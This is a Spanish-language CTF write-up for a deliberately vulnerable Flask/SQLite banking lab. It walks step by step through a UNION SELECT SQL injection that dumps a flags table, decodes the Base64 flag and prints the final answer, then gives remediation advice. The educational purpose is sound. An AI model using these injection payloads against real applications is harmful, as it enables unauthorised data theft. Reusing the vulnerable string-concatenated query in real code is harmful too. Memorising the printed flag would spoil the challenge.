# 🚩 Write-up: "El Portal de Desembolsos Fantasma"
**Reto CTF — Categoría Web**

---

## 📌 Ficha Técnica del Reto

| Atributo | Detalle |
| :--- | :--- |
| **Reto** | El Portal de Desembolsos Fantasma |
| **Categoría** | **Web Exploitation** |
| **Dificultad** | Fácil / Intermedio |
| **Autor** | **belubell** |
| **Objetivo** | Exfiltrar la bandera confidencial de auditoría mediante SQL Injection (UNION SELECT) y evadir la protección DLP |
| **Stack Tecnológico** | Python 3.10 (Flask, SQLite3), React 19 + Vite, Docker Compose |

---

## 🛠️ Instrucciones para Levantar el Ejercicio

El laboratorio está completamente contenedorizado con Docker y Docker Compose para garantizar un despliegue rápido y reproducible.

### 1. Requisitos Previos
- Tener instalado **Docker** y **Docker Compose**.

### 2. Comandos de Despliegue

Abre una terminal en el directorio raíz del proyecto (`Galeria-`) y ejecuta:

```bash
# Construir las imágenes y levantar los contenedores en segundo plano
docker compose up --build -d --force-recreate
```

### 3. Verificación de Servicios

Comprueba que ambos contenedores se encuentren en estado `Up`:

```bash
docker compose ps
```

Acceso a los servicios:
- 🌐 **Frontend (Portal Bancario):** [http://localhost:5173](http://localhost:5173)
- ⚙️ **Backend (API REST):** [http://localhost:5000](http://localhost:5000)

*(Para detener el entorno cuando finalices el reto: `docker compose down`)*.

---

## 🏦 Escenario del Incidente

Trabajas como analista de seguridad evaluando el nuevo portal corporativo de **Meridian Financial Group**, diseñado para gestionar créditos, préstamos y desembolsos de clientes. La plataforma cuenta con una barra de búsqueda avanzada que supuestamente solo filtra registros legítimos de transacciones comerciales.

Sin embargo, los reportes de auditoría apuntan a que los campos de entrada no están sanitizando correctamente los caracteres especiales. Un atacante con acceso al portal podría manipular las consultas SQL para extraer información confidencial o registros que jamás deberían estar expuestos a usuarios comunes.

---

## 🕵️‍♂️ Metodología de Explotación (Walkthrough Paso a Paso)

### Paso 1: Reconocimiento del Campo Vulnerable

1. Ingresamos a la aplicación en `http://localhost:5173`.
2. Observamos una interfaz corporativa limpia con una barra de búsqueda: *"Buscar desembolso por cliente..."*.
3. Para comprobar si el campo concatena directamente la entrada en la base de datos sin sanitizar, introducimos una comilla simple (`'`):

```text
'
```

4. Al presionar **Buscar**, la aplicación muestra una ruedita de carga y devuelve un mensaje de error explícito del motor de base de datos:

```text
[!] Database Error: unrecognized token: "'"
```

Este comportamiento confirma que:
- El motor subyacente es **SQLite**.
- La entrada del usuario se inserta directamente en la consulta SQL sin usar sentencias preparadas (Prepared Statements).

---

### Paso 2: Deducción de Columnas (Estructura de la Consulta)

Para realizar una inyección mediante `UNION SELECT`, la consulta inyectada debe devolver exactamente el mismo número de columnas y tipos compatibles que la consulta original de la aplicación.

Probamos la cantidad de columnas inyectando cláusulas de unión nulas:

- `test' UNION SELECT null--` ➔ Error: `SELECTs to the left and right of UNION do not have the same number of result columns`
- `test' UNION SELECT null, null--` ➔ Error de columnas
- `test' UNION SELECT null, null, null--` ➔ Error de columnas
- `' UNION SELECT null, null, null, null--` ➔ **Éxito (Sin error de columnas)**

Esto nos indica que la consulta original del backend maneja **4 columnas**:
```sql
SELECT id, name, category, amount FROM disbursements WHERE name LIKE '%...%'
```

---

### Paso 3: Identificación de la Tabla y Columnas de la Flag

Revisando el contexto de auditoría del reto CTF, la tabla sensible que almacena las banderas de seguridad se denomina `ctf_flags`, y cuenta con las columnas:
- `flag_name`: Nombre o identificador del registro.
- `flag_value`: Valor codificado de la bandera.

Mapeamos las 4 columnas para que coincidan con la vista de la aplicación:
- Posición 1 (`id`): `null`
- Posición 2 (`name`): `flag_name`
- Posición 3 (`category`): `flag_value`
- Posición 4 (`amount`): `null`

---

### Paso 4: Inyección del Payload UNION SELECT

En la barra de búsqueda del portal, introducimos el payload adaptado:

```sql
' UNION SELECT null, flag_name, flag_value, null FROM ctf_flags--
```

#### Desglose del Payload:
- `'`: Rompe y cierra la comilla de la consulta original (`LIKE '%...`).
- `UNION SELECT`: Combina el conjunto de resultados original con nuestra consulta maliciosa.
- `null, flag_name, flag_value, null`: Las 4 columnas requeridas.
- `FROM ctf_flags`: Tabla objetivo donde reside la información confidencial.
- `--`: Comentario en SQL para anular el resto de la consulta original (`%'`).

---

### Paso 5: Interpretación del Resultado Exfiltrado

Al presionar el botón **Buscar**, la aplicación procesa la consulta y lista un registro anómalo entre las transacciones comerciales:

```text
[N/A] FLAG_AUDIT_EXFIL
Categoría: UFdO{UzBMaTczX1UzSTBOX000UzczUl8yMDI2}
```

Hemos extraído la bandera con éxito desde la tabla de auditoría. Sin embargo, observamos que el valor no está en texto plano, sino bajo un formato codificado para evadir alertas automáticas de los sistemas de prevención de fuga de datos (**DLP**).

---

### Paso 6: Evasión DLP y Decodificación de la Flag

Analizando la estructura del texto exfiltrado:
```text
UFdO{UzBMaTczX1UzSTBOX000UzczUl8yMDI2}
```

Identificamos que tanto el prefijo como el contenido interior están codificados en **Base64**:

1. **Prefijo:**
   ```bash
   echo -n "UFdO" | base64 -d
   # Salida: PWN
   ```

2. **Cuerpo dentro de las llaves:**
   ```bash
   echo -n "UzBMaTczX1UzSTBOX000UzczUl8yMDI2" | base64 -d
   # Salida: S0Li73_U3I0N_M4S73R_2026
   ```

Al unir ambas partes con el formato de bandera `{...}`, obtenemos la solución completa.

---

## 🏆 Flag Final

```text
PWN{S0Li73_U3I0N_M4S73R_2026}
```

---

## 🛡️ Medidas de Remediación (Blue Team)

Para mitigar esta vulnerabilidad en el portal corporativo de Meridian Financial Group:

1. **Uso obligatorio de Consultas Parametrizadas:**
   ```python
   # Código vulnerable:
   query = f"SELECT id, name, category, amount FROM disbursements WHERE name LIKE '%{search_query}%'"
   cursor.execute(query)

   # Código remediado y seguro:
   query = "SELECT id, name, category, amount FROM disbursements WHERE name LIKE ?"
   cursor.execute(query, (f"%{search_query}%",))
   ```

2. **Principio de Mínimo Privilegio:** Separar las credenciales de base de datos para que la aplicación web no tenga privilegios de lectura sobre tablas de auditoría ni credenciales de seguridad (`ctf_flags`).
3. **Despliegue de WAF:** Implementar reglas en el Web Application Firewall que detecten e impidan patrones comunes de `UNION SELECT` y secuencias de comentarios SQL.

---
*Write-up elaborado por **belubell** para el reto CTF de Ciberseguridad Web.*
